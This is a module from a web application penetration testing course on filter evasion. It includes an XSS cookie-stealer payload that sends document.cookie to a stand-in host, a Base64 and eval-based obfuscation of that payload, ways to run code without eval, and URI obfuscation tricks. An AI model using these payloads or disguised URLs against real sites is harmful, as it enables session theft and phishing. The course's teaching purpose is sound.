# Web Application Penetration Testing eXtreme

## Section 01 | Module 02
© Caendra Inc. 2020
All Rights Reserved

### Table of Contents
- **Module 02**
  - 2.1 Base64 Encoding Evasion
  - 2.2 URI Obfuscation Techniques
  - 2.3 JavaScript Obfuscation Techniques
  - 2.4 PHP Obfuscation Techniques

---

## Introduction & Learning Objectives

In the previous sections, we explored various countermeasures against web application attacks. However, these measures are not always sufficient and can often be bypassed. To address this, two primary strategies are employed: attack vector optimization and the use of obfuscation techniques. The latter has been widely utilized in web attacks over the past decade.

The process of evading detection systems is akin to a game of "cops and robbers." Security researchers (the "robbers") devise methods to evade detection, which are then publicly disclosed. Subsequently, defenders (the "cops") implement solutions to mitigate these vulnerabilities, prompting the need for new evasion techniques.

### Learning Objectives
In this module, we will cover evasion techniques, including encoding and obfuscation.

---

## 2.1 Base64 Encoding Evasion

Detection systems often use Regex-based filters to search for malicious strings in JavaScript code, such as `eval`, `alert`, `prompt`, `document.cookie`, and other potential threats.

### 2.1.1 Cookie Stealer

To steal cookies that are not marked as `HttpOnly` is relatively straightforward. A common JavaScript payload for this purpose is:
```javascript
location.href = 'http://evilpath.com/?c=' + escape(document.cookie);
```
A Regex-based filtering system may detect the `document.cookie` keyword and block the attack vector.

#### Using Base64 Encoding
Base64 encoding can be used to hide the `document.cookie` code. For example:
```javascript
eval(atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk="));
```
However, the `eval` function may also be blacklisted. Therefore, alternative methods to parse a string as JavaScript include:
- `[].constructor.constructor("code")()`
- `setTimeout("code")` (all browsers)
- `setInterval("code")` (all browsers)
- `setImmediate("code")` (IE 10+)
- `Function("code")()` (all browsers)

---

## 2.2 URI Obfuscation Techniques

URIs are fundamental elements of Internet communication, providing a uniform resource identifier and playing a central role in web navigation. URI obfuscation can be useful for both bypassing filtered systems and shortening URLs to meet length constraints. This section will explore several URI obfuscation techniques.

### 2.2.1 URL Shortening

URL shortening is a technique that reduces the length of a URL while still directing to the required page. This is typically achieved through an HTTP Redirect (301 Moved Permanently) header.

#### Example: Google URL Shortener
- **Short URL**: `http://goo.gl/abc123`
- **Long URL**: `http://www.example.com/very-long-url`

URL shortening is particularly useful in messaging systems with character limits, such as Twitter. However, it can also be misused for illicit activities like phishing or spamming.

#### Running Your Own URL Shortener
Starting your own URL shortener is straightforward, with many free and open-source services available. Some service providers have implemented features to preview where shortened links point, helping users identify potentially malicious links.

### 2.2.1.1 Bitly.com Short Link Info
Bitly.com (bit.ly / j.mp) and managed enterprise sites such as amzn.to, on.fb.me, etc., allow users to preview the destination of a shortened link by adding a plus (+) after the short URL.

### 2.2.1.2 Other Services Short Link Info
- **Tinyurl.com**: Preview SUBDOMAIN
  - `http://preview.tinyurl.com/ph7xh4m`
- **Tiny.cc**: Trailing TILDE
  - `http://tiny.cc/hack_me~`

For services that do not provide this feature, such as t.co used by Twitter, online solutions are available.

### 2.2.1.3 cURL Link Resolver
You can manually resolve URLs using tools like cURL to read the response headers and determine the final destination.

### 2.2.2 URL Hostname Obfuscation

According to RFC 3986, the following are valid URL formats:
- `https://hack.me/s/#n:xss`
- `https://hack.me:443`
- `https://_[this_is_valid]PI:EMAIL`

#### 2.2.2.1 URL Authority Obfuscation
The Authority component of a URI can be obfuscated. The structure is:
- `[ userinfo "@" ] host [ ":" port ]`

#### Obfuscating with Userinfo
- **Basic Example**:
  - `https://username:password@hack.me/protected_path`
  - If no authentication is required, the `userinfo` text is ignored.
- **Example with Unicode**:
  - `https://✌(◕‿-)✌@hack.me`
  - `https://mail.google.com⁄mail⁄u⁄0⁄ʔpli=1＃PI:EMAIL`

Not all browsers support this obfuscation technique, and some may display alert messages.

---

This module provides a comprehensive overview of evasion techniques, including Base64 encoding and URI obfuscation, to help you understand and implement these methods effectively.